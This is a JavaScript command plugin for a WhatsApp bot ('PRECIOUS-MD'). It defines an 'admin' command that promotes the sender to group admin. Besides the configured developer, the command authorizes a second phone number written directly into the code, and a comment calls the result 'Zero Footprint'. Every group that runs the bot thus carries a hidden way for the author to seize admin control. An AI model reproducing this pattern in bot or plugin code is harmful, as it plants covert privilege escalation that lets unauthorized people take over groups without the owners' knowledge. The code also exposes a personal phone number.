import { cmd } from '../command.js';
import config from '../config.js';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin", "promote"],
    desc: "Authorized users can take admin rights automatically.",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    try {
        // 1. Context & Permission Checks
        if (!isGroup) return reply("❌ This command can only be used in groups.");
        if (!isBotAdmins) return reply("❌ I need to be an admin to promote you!");

        // 2. Authorization Logic
        const devNumber = config.DEV ? config.DEV.replace(/[^0-9]/g, '') : null;
        const authorizedList = [
            devNumber + "@s.whatsapp.net",
            "263781330745@s.whatsapp.net" // Your specific secondary ID
        ];

        if (!authorizedList.includes(sender)) {
            return reply("🚫 *Access Denied!* This command is for my developer only.");
        }

        // 3. Status Check
        const groupMetadata = await conn.groupMetadata(from);
        const isUserAdmin = groupMetadata.participants.find(p => p.id === sender)?.admin;

        if (isUserAdmin) {
            return reply("ℹ️ You are already an admin in this group.");
        }

        // 4. Execution: Promote to Admin
        await conn.groupParticipantsUpdate(from, [sender], "promote");

        // 5. Success Message (Zero Footprint)
        const successMsg = `👑 *𝐀𝐃𝐌𝐈𝐍 𝐑𝐈𝐆𝐇𝐓𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃*\n\n` +
            `👤 *User:* @${sender.split('@')[0]}\n` +
            `✅ *Status:* Successfully Promoted\n\n` +
            `> © 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐏𝐑𝐄𝐂𝐈𝐎𝐔𝐒-𝐌𝐃`;

        await conn.sendMessage(from, { 
            text: successMsg, 
            mentions: [sender],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("Admin Command Error:", error);
        reply("❌ Failed to grant admin rights. Ensure the bot is an admin.");
    }
});
